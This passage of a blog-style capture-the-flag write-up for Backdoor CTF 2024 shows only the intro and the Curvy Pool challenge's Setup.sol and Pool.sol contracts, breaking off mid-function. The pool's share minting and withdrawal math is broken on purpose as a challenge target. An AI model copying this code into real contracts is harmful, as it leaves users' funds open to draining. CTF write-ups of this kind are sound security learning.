@@ -1,0 +1,668 @@
+<!doctype html><html lang=en><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
+         Backdoor CTF 2024
+        
+    </title><meta content="Backdoor CTF 2024" property=og:title><link href=/favicons/favicon.ico rel=icon type=image/png><link href=https://themj0ln1r.github.io/fonts.css rel=stylesheet><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel=stylesheet><script async data-goatcounter=https://themj0ln1r.goatcounter.com/count src=https://themj0ln1r.github.io/js/count.js></script><noscript><img src="https://themj0ln1r.goatcounter.com//count?p=/archive/backdoorctf24/&t=Backdoor CTF 2024"></noscript><script src=https://themj0ln1r.github.io/js/codeblock.js></script><script src=https://themj0ln1r.github.io/js/toc.js></script><script src=https://themj0ln1r.github.io/js/note.js></script><script>MathJax = {
+              tex: {
+                inlineMath: [['$', '$'], ['\\(', '\\)']]
+              }
+            };</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><link title="TheMj0ln1r Blog" href=https://themj0ln1r.github.io/atom.xml rel=alternate type=application/atom+xml><link href=https://themj0ln1r.github.io/theme/light.css rel=stylesheet><link href=https://themj0ln1r.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><script src=https://themj0ln1r.github.io/js/themetoggle.js></script><script>setTheme(getSavedTheme());</script><link href=https://themj0ln1r.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://themj0ln1r.github.io/><b>TheMj0ln1r Blog</b></a><div class=socials></div></div><nav><a href=https://themj0ln1r.github.io/cv style=margin-left:.5em><b>CV</b></a><a href=https://themj0ln1r.github.io/archive style=margin-left:.5em><b>Archive</b></a><a href=https://themj0ln1r.github.io/tags style=margin-left:.5em><b>Tags</b></a> |<a onclick="toggleTheme(); event.preventDefault();" href=# id=dark-mode-toggle> <img alt=Light id=sun-icon src=https://themj0ln1r.github.io/feather/sun.svg style=filter:invert()> <img alt=Dark id=moon-icon src=https://themj0ln1r.github.io/feather/moon.svg> </a><script>updateItemToggleTheme()</script></nav></header><main><article><div class=title><div class=page-header>Backdoor CTF 2024</div><div class=meta>Posted on <time>2024-12-23</time><span class=tags-label> :: Tags:</span><span class=tags> <a class=post-tag href=https://themj0ln1r.github.io/tags/ctf/>ctf</a>, <a class=post-tag href=https://themj0ln1r.github.io/tags/blockchain/>blockchain</a> </span></div></div><div class=toc-container><h5 class=toc-title>Table of Contents</h5><ul class=toc-list><li><a href=https://themj0ln1r.github.io/archive/backdoorctf24/#curvy-pool>Curvy Pool</a> <ul><li><a href=https://themj0ln1r.github.io/archive/backdoorctf24/#solution>Solution</a></ul><li><a href=https://themj0ln1r.github.io/archive/backdoorctf24/#runing-attack-script>Runing attack script</a><li><a href=https://themj0ln1r.github.io/archive/backdoorctf24/#easypeasy>EasyPeasy</a> <ul><li><a href=https://themj0ln1r.github.io/archive/backdoorctf24/#solution-1>Solution</a></li><ul><li><a href=https://themj0ln1r.github.io/archive/backdoorctf24/#challenge-analysis>Challenge Analysis</a><li><a href=https://themj0ln1r.github.io/archive/backdoorctf24/#solution-explanation>Solution Explanation</a><li><a href=https://themj0ln1r.github.io/archive/backdoorctf24/#attack-script-explanation>Attack Script Explanation</a></ul></ul><li><a href=https://themj0ln1r.github.io/archive/backdoorctf24/#betray>Betray</a> <ul><li><a href=https://themj0ln1r.github.io/archive/backdoorctf24/#solution-2>Solution</a><li><a href=https://themj0ln1r.github.io/archive/backdoorctf24/#solution-3>Solution</a></li><ul><li><a href=https://themj0ln1r.github.io/archive/backdoorctf24/#vulnerability-analysis>Vulnerability Analysis</a><li><a href=https://themj0ln1r.github.io/archive/backdoorctf24/#writing-the-required-smart-contract-in-bytecode>Writing the Required Smart Contract in Bytecode</a><li><a href=https://themj0ln1r.github.io/archive/backdoorctf24/#solution-script>Solution Script</a></ul></ul></ul></div><section class=body><p>Back to CTF's to be sharper in problem solving. I played <a href=https://ctftime.org/event/2540 target=_blank>Backdoor CTF 2023</a> with our amazing team <a href=https://ctftime.org/team/364723 target=_blank>Infobahn</a>. We got <strong><code>4th</code></strong> place in this CTF. I solved few Blockchain challs as usual. Solutions,<h1 id=curvy-pool>Curvy Pool</h1><p>No description required, <code>isSolved()</code> is the problem statement for us (most of the time).<div class=note-container><button class=note-toggle><div class=note-icon><p>Setup.sol</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
+</span><span style=color:#a71d5d;font-weight:700>pragma solidity ^</span><span style=color:#0086b3>0.8.16</span><span>;
+</span><span>
+</span><span style=color:#a71d5d;font-weight:700>import</span><span> {</span><span style=color:#0086b3>ERC20</span><span>} from "./</span><span style=color:#0086b3>ERC20</span><span>.sol";
+</span><span style=color:#a71d5d;font-weight:700>import</span><span> {Pool} from "./Pool.sol";
+</span><span>
+</span><span style=color:#969896;font-style:italic>// Dummy WETH Token
+</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>DummyWETH </span><span style=color:#a71d5d;font-weight:700>is ERC20 </span><span>{
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>uint256 </span><span>supply) </span><span style=color:#62a35c>ERC20</span><span>(</span><span style=color:#183691>"Dummy WETH"</span><span>, </span><span style=color:#183691>"WETH-D"</span><span>) {
+</span><span>        </span><span style=color:#62a35c>_mint</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, supply);
+</span><span>    }
+</span><span>}
+</span><span>
+</span><span style=color:#969896;font-style:italic>// Dummy PUFETH Token
+</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>DummyPUFETH </span><span style=color:#a71d5d;font-weight:700>is ERC20 </span><span>{
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>uint256 </span><span>supply) </span><span style=color:#62a35c>ERC20</span><span>(</span><span style=color:#183691>"Dummy PUFETH"</span><span>, </span><span style=color:#183691>"PUFETH-D"</span><span>) {
+</span><span>        </span><span style=color:#62a35c>_mint</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, supply);
+</span><span>    }
+</span><span>}
+</span><span>
+</span><span style=color:#969896;font-style:italic>// Deployment Script
+</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Setup </span><span>{
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>=> </span><span style=color:#0086b3>bool</span><span>) </span><span style=color:#a71d5d;font-weight:700>public</span><span> hasClaimedWETH;
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>=> </span><span style=color:#0086b3>bool</span><span>) </span><span style=color:#a71d5d;font-weight:700>public</span><span> hasClaimedPUFETH;
+</span><span>    DummyWETH </span><span style=color:#a71d5d;font-weight:700>private </span><span>wethToken </span><span style=color:#a71d5d;font-weight:700>= new </span><span style=color:#62a35c>DummyWETH</span><span>(</span><span style=color:#0086b3>11 ether</span><span>);
+</span><span>    DummyPUFETH </span><span style=color:#a71d5d;font-weight:700>private </span><span>pufethToken</span><span style=color:#a71d5d;font-weight:700>= new </span><span style=color:#62a35c>DummyPUFETH</span><span>(</span><span style=color:#0086b3>11 ether</span><span>);
+</span><span>    Pool </span><span style=color:#a71d5d;font-weight:700>public immutable </span><span>pool </span><span style=color:#a71d5d;font-weight:700>= new </span><span style=color:#62a35c>Pool</span><span>(</span><span style=color:#0086b3>address</span><span>(wethToken), </span><span style=color:#0086b3>address</span><span>(pufethToken), 0);
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>() </span><span style=color:#a71d5d;font-weight:700>payable</span><span>{
+</span><span>        </span><span style=color:#969896;font-style:italic>// Deploy Dummy Tokens
+</span><span>
+</span><span>         </span><span style=color:#969896;font-style:italic>// Deploy Pool
+</span><span>
+</span><span>        </span><span style=color:#969896;font-style:italic>// Approve and add liquidity
+</span><span>        wethToken.</span><span style=color:#62a35c>approve</span><span>(</span><span style=color:#0086b3>address</span><span>(pool), </span><span style=color:#0086b3>10 ether</span><span>);
+</span><span>        pufethToken.</span><span style=color:#62a35c>approve</span><span>(</span><span style=color:#0086b3>address</span><span>(pool), </span><span style=color:#0086b3>10 ether</span><span>);
+</span><span>
+</span><span>        pool.</span><span style=color:#62a35c>addLiquidity</span><span>(</span><span style=color:#0086b3>10 ether</span><span>, </span><span style=color:#0086b3>10 ether</span><span>);
+</span><span>
+</span><span>        </span><span style=color:#969896;font-style:italic>// Log addresses for reference
+</span><span>        </span><span style=color:#969896;font-style:italic>// console.log("WETH-D Token:", address(wethToken));
+</span><span>        </span><span style=color:#969896;font-style:italic>// console.log("PUFETH-D Token:", address(pufethToken));
+</span><span>        </span><span style=color:#969896;font-style:italic>// console.log("Pool:", address(pool));
+</span><span>
+</span><span>    }
+</span><span>
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>claimWETH</span><span>() </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
+</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#a71d5d;font-weight:700>!</span><span>hasClaimedWETH[msg.sender], </span><span style=color:#183691>"Already claimed WETH"</span><span>);
+</span><span>        hasClaimedWETH[msg.sender] </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>true</span><span>;
+</span><span>        wethToken.</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>,1 ether);
+</span><span>
+</span><span>        
+</span><span>    }
+</span><span>
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>claimPUFETH</span><span>() </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
+</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#a71d5d;font-weight:700>!</span><span>hasClaimedPUFETH[msg.sender], </span><span style=color:#183691>"Already claimed PUFETH"</span><span>);
+</span><span>        hasClaimedPUFETH[msg.sender] </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>true</span><span>;
+</span><span>        pufethToken.</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>,1 ether);
+</span><span>    }
+</span><span>
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>isSolved</span><span>(</span><span style=color:#0086b3>address </span><span>user) </span><span style=color:#a71d5d;font-weight:700>public view returns</span><span>(</span><span style=color:#0086b3>bool</span><span>){
+</span><span>        </span><span style=color:#0086b3>uint256</span><span> sharesHeldByPoolOwner </span><span style=color:#a71d5d;font-weight:700>=</span><span> pool.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>));
+</span><span>        </span><span style=color:#0086b3>uint256</span><span> sharesToWin </span><span style=color:#a71d5d;font-weight:700>=</span><span> sharesHeldByPoolOwner</span><span style=color:#a71d5d;font-weight:700>/</span><span>2;
+</span><span>        </span><span style=color:#0086b3>uint256</span><span> sharesHeldBySender </span><span style=color:#a71d5d;font-weight:700>=</span><span> pool.</span><span style=color:#62a35c>balanceOf</span><span>(user);
+</span><span>
+</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> sharesHeldBySender </span><span style=color:#a71d5d;font-weight:700>></span><span> sharesToWin;
+</span><span>    }
+</span><span>}
+</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Pool.sol</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: UNLICENSED
+</span><span style=color:#a71d5d;font-weight:700>pragma solidity ^</span><span style=color:#0086b3>0.8.16</span><span>;
+</span><span>
+</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"./IERC20.sol"</span><span>;
+</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"./LiquidityToken.sol"</span><span>;
+</span><span>
+</span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>Pool__InvalidTokenRatio</span><span>();
+</span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>Pool__ZeroLiquidityToken</span><span>();
+</span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>Pool__InvalidToken</span><span>();
+</span><span>
+</span><span>
+</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Pool </span><span style=color:#a71d5d;font-weight:700>is </span><span style=color:#62a35c>LiquidityToken </span><span>{
+</span><span>
+</span><span>    </span><span style=color:#0086b3>IERC20 </span><span style=color:#a71d5d;font-weight:700>private immutable</span><span> i_token0;
+</span><span>    </span><span style=color:#0086b3>IERC20 </span><span style=color:#a71d5d;font-weight:700>private immutable</span><span> i_token1;
+</span><span>
+</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>private</span><span> s_reserve0;
+</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>private</span><span> s_reserve1;
+</span><span>
+</span><span>
+</span><span>    </span><span style=color:#0086b3>uint8 </span><span style=color:#a71d5d;font-weight:700>private immutable</span><span> i_fee;
+</span><span>
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>AddedLiquidity</span><span>(
+</span><span>        </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>liquidityToken,
+</span><span>        </span><span style=color:#0086b3>address </span><span>token0,
+</span><span>        </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>amount0,
+</span><span>        </span><span style=color:#0086b3>address </span><span>token1,
+</span><span>        </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>amount1
+</span><span>    );
+</span><span>
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>RemovedLiquidity</span><span>(
+</span><span>        </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>liquidityToken,
+</span><span>        </span><span style=color:#0086b3>address </span><span>token0,
+</span><span>        </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>amount0,
+</span><span>        </span><span style=color:#0086b3>address </span><span>token1,
+</span><span>        </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>amount1
+</span><span>    );
+</span><span>
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>Swapped</span><span>(
+</span><span>        </span><span style=color:#0086b3>address </span><span>tokenIn,
+</span><span>        </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>amountIn,
+</span><span>        </span><span style=color:#0086b3>address </span><span>tokenOut,
+</span><span>        </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>amountOut
+</span><span>    );
+</span><span>
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(
+</span><span>        </span><span style=color:#0086b3>address </span><span>token0,
+</span><span>        </span><span style=color:#0086b3>address </span><span>token1,
+</span><span>        </span><span style=color:#0086b3>uint8 </span><span>fee
+</span><span>    ) </span><span style=color:#62a35c>LiquidityToken</span><span>(</span><span style=color:#183691>"Backdoor Token"</span><span>, </span><span style=color:#183691>"BT"</span><span>) {
+</span><span>        i_token0 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(token0);
+</span><span>        i_token1 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(token1);
+</span><span>        i_fee </span><span style=color:#a71d5d;font-weight:700>=</span><span> fee;
+</span><span>        s_reserve0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> 0;
+</span><span>        s_reserve1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> 0;
+</span><span>        i_token0.</span><span style=color:#62a35c>approve</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), </span><span style=color:#a71d5d;font-weight:700>type</span><span>(</span><span style=color:#0086b3>uint256</span><span>).</span><span style=color:#a71d5d;font-weight:700>max</span><span>);
+</span><span>        i_token1.</span><span style=color:#62a35c>approve</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), </span><span style=color:#a71d5d;font-weight:700>type</span><span>(</span><span style=color:#0086b3>uint256</span><span>).</span><span style=color:#a71d5d;font-weight:700>max</span><span>);
+</span><span>    }
+</span><span>
+</span><span>    
+</span><span>
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_updateLiquidity</span><span>(</span><span style=color:#0086b3>uint256 </span><span>reserve0, </span><span style=color:#0086b3>uint256 </span><span>reserve1) </span><span style=color:#a71d5d;font-weight:700>internal </span><span>{
+</span><span>        s_reserve0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> reserve0;
+</span><span>        s_reserve1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> reserve1;
+</span><span>    }
+</span><span>
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>swap</span><span>(</span><span style=color:#0086b3>address </span><span>_tokenIn, </span><span style=color:#0086b3>uint256 </span><span>amountIn) </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
+</span><span>        </span><span style=color:#969896;font-style:italic>// Objective: To Find amount of Token Out
+</span><span>        (</span><span style=color:#0086b3>uint256</span><span> amountOut, </span><span style=color:#0086b3>uint256</span><span> resIn, </span><span style=color:#0086b3>uint256</span><span> resOut, </span><span style=color:#0086b3>bool</span><span> isToken0) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getAmountOut</span><span>(_tokenIn, amountIn);
+</span><span>
+</span><span>        </span><span style=color:#0086b3>IERC20</span><span> token0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> i_token0; </span><span style=color:#969896;font-style:italic>// gas optimization
+</span><span>        </span><span style=color:#0086b3>IERC20</span><span> token1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> i_token1; </span><span style=color:#969896;font-style:italic>// gas optimization
+</span><span>
+</span><span>        (</span><span style=color:#0086b3>uint256</span><span> res0, </span><span style=color:#0086b3>uint256</span><span> res1, </span><span style=color:#0086b3>IERC20</span><span> tokenIn, </span><span style=color:#0086b3>IERC20</span><span> tokenOut) </span><span style=color:#a71d5d;font-weight:700>=</span><span> isToken0
+</span><span>            </span><span style=color:#a71d5d;font-weight:700>? </span><span>(resIn </span><span style=color:#a71d5d;font-weight:700>+</span><span> amountIn, resOut </span><span style=color:#a71d5d;font-weight:700>-</span><span> amountOut, token0, token1)
+</span><span>            </span><span style=color:#a71d5d;font-weight:700>: </span><span>(resOut </span><span style=color:#a71d5d;font-weight:700>-</span><span> amountOut, resIn </span><span style=color:#a71d5d;font-weight:700>+</span><span> amountIn, token1, token0);
+</span><span>        </span><span style=color:#0086b3>bool</span><span> success </span><span style=color:#a71d5d;font-weight:700>=</span><span> tokenIn.</span><span style=color:#62a35c>transferFrom</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), amountIn);
+</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(success, </span><span style=color:#183691>"Swap Failed"</span><span>);
+</span><span>
+</span><span>        </span><span style=color:#62a35c>_updateLiquidity</span><span>(res0, res1);
+</span><span>        tokenOut.</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, amountOut);
+</span><span>
+</span><span>        </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#62a35c>Swapped</span><span>(</span><span style=color:#0086b3>address</span><span>(tokenIn), amountIn, </span><span style=color:#0086b3>address</span><span>(tokenOut), amountOut);
+</span><span>    }
+</span><span>
+</span><span>
+</span><span>
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>addLiquidity</span><span>(</span><span style=color:#0086b3>uint256 </span><span>amount0, </span><span style=color:#0086b3>uint256 </span><span>amount1) </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
+</span><span>        </span><span style=color:#0086b3>uint256</span><span> reserve0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> s_reserve0; </span><span style=color:#969896;font-style:italic>// gas optimization
+</span><span>        </span><span style=color:#0086b3>uint256</span><span> reserve1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> s_reserve1; </span><span style=color:#969896;font-style:italic>// gas optimization
+</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(amount0 </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span> 0 || amount1 &lt; 0) {
+</span><span>            </span><span style=color:#a71d5d;font-weight:700>revert </span><span style=color:#62a35c>Pool__InvalidTokenRatio</span><span>();
+</span><span>        }
+</span><span>
+</span><span>        </span><span style=color:#0086b3>IERC20</span><span> token0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> i_token0; </span><span style=color:#969896;font-style:italic>// gas optimization
+</span><span>        </span><span style=color:#0086b3>IERC20</span><span> token1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> i_token1; </span><span style=color:#969896;font-style:italic>// gas optimization
+</span><span>
+</span><span>        token0.</span><span style=color:#62a35c>transferFrom</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), amount0);
+</span><span>        token1.</span><span style=color:#62a35c>transferFrom</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), amount1);
+</span><span>
+</span><span>        </span><span style=color:#0086b3>uint256</span><span> liquidityTokens </span><span style=color:#a71d5d;font-weight:700>= </span><span>((amount0</span><span style=color:#a71d5d;font-weight:700>*</span><span>amount0) </span><span style=color:#a71d5d;font-weight:700>+ </span><span>(amount1</span><span style=color:#a71d5d;font-weight:700>*</span><span>amount1))</span><span style=color:#a71d5d;font-weight:700>/</span><span>(1 ether);
+</span><span>
+</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(liquidityTokens </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) </span><span style=color:#a71d5d;font-weight:700>revert </span><span style=color:#62a35c>Pool__ZeroLiquidityToken</span><span>();
+</span><span>        </span><span style=color:#62a35c>_mint</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, liquidityTokens);
+</span><span>        </span><span style=color:#62a35c>_updateLiquidity</span><span>(reserve0 </span><span style=color:#a71d5d;font-weight:700>+</span><span> amount0, reserve1 </span><span style=color:#a71d5d;font-weight:700>+</span><span> amount1);
+</span><span>
+</span><span>        </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#62a35c>AddedLiquidity</span><span>(
+</span><span>            liquidityTokens,
+</span><span>            </span><span style=color:#0086b3>address</span><span>(token0),
+</span><span>            amount0,
+</span><span>            </span><span style=color:#0086b3>address</span><span>(token1),
+</span><span>            amount1
+</span><span>        );
+</span><span>    }
+</span><span>
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>removeLiquidity</span><span>(</span><span style=color:#0086b3>uint256 </span><span>liquidityTokens) </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
+</span><span>        (</span><span style=color:#0086b3>uint256</span><span> amount0, </span><span style=color:#0086b3>uint256</span><span> amount1) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getAmountsOnRemovingLiquidity</span><span>(liquidityTokens);
+</span><span>
+</span><span>        </span><span style=color:#62a35c>_burn</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, liquidityTokens);
+</span><span>        </span><span style=color:#62a35c>_updateLiquidity</span><span>(s_reserve0 </span><span style=color:#a71d5d;font-weight:700>-</span><span> amount0, s_reserve1 </span><span style=color:#a71d5d;font-weight:700>-</span><span> amount1);
+</span><span>
+</span><span>        </span><span style=color:#0086b3>IERC20</span><span> token0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> i_token0; </span><span style=color:#969896;font-style:italic>// gas optimization
+</span><span>        </span><span style=color:#0086b3>IERC20</span><span> token1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> i_token1; </span><span style=color:#969896;font-style:italic>// gas optimization
+</span><span>
+</span><span>        token0.</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, amount0);
+</span><span>        token1.</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, amount1);
+</span><span>
+</span><span>        </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#62a35c>RemovedLiquidity</span><span>(
+</span><span>            liquidityTokens,
+</span><span>            </span><span style=color:#0086b3>address</span><span>(token0),
+</span><span>            amount0,
+</span><span>            </span><span style=color:#0086b3>address</span><span>(token1),
+</span><span>            amount1
+</span><span>        );
+</span><span>    }
+</span><span>
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getAmountsOnRemovingLiquidity</span><span>(</span><span style=color:#0086b3>uint256 </span><span>liquidityTokens) </span><span style=color:#a71d5d;font-weight:700>public view returns</span><span>(</span><span style=color:#0086b3>uint256</span><span> amount0, </span><span style=color:#0086b3>uint256</span><span> amount1){
+</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(liquidityTokens </span><span style=color:#a71d5d;font-weight:700>></span><span> 0, </span><span style=color:#183691>"0 Liquidity Tokens"</span><span>);
+</span><span>        amount0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> liquidityTokens</span><span style=color:#a71d5d;font-weight:700>/</span><span>2;
+</span><span>        amount1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> liquidityTokens</span><span style=color:#a71d5d;font-weight:700>/</span><span>2;
+</span><span>    }
+</span><span>
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getAmountOut</span><span>(
+</span><span>        </span><span style=color:#0086b3>address </span><span>_tokenIn,
+</span><span>        </span><span style=color:#0086b3>uint </span><span>amountIn
+</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>public view returns </span><span>(</span><span style=color:#0086b3>uint</span><span>, </span><span style=color:#0086b3>uint</span><span> , </span><span style=color:#0086b3>uint</span><span> , </span><span style=color:#0086b3>bool</span><span>) {
+</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(
+</span><span>            _tokenIn </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>address</span><span>(i_token0) </span><span style=color:#a71d5d;font-weight:700>||</span><span> _tokenIn </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>address</span><span>(i_token1),
+</span><span>            </span><span style=color:#183691>"Invalid Token"
+</span><span>        );
+</span><span>
+</span><span>        </span><span style=color:#0086b3>bool</span><span> isToken0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> _tokenIn </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>address</span><span>(i_token0) </span><span style=color:#a71d5d;font-weight:700>? </span><span style=color:#0086b3>true </span><span style=color:#a71d5d;font-weight:700>: </span><span style=color:#0086b3>false</span><span>;
+</span><span>
+</span><span>        </span><span style=color:#0086b3>uint256</span><span> reserve0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> s_reserve0; </span><span style=color:#969896;font-style:italic>// gas optimization
+</span><span>        </span><span style=color:#0086b3>uint256</span><span> reserve1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> s_reserve1; </span><span style=color:#969896;font-style:italic>// gas optimization
+</span><span>
+</span><span>        (
+</span><span>            </span><span style=color:#0086b3>uint256</span><span> resIn,
+</span><span>            </span><span style=color:#0086b3>uint256</span><span> resOut
+</span><span>        ) </span><span style=color:#a71d5d;font-weight:700>=</span><span> isToken0
+</span><span>                </span><span style=color:#a71d5d;font-weight:700>? </span><span>(reserve0, reserve1)
+</span><span>                </span><span style=color:#a71d5d;font-weight:700>: </span><span>(reserve1, reserve0);
+</span><span>
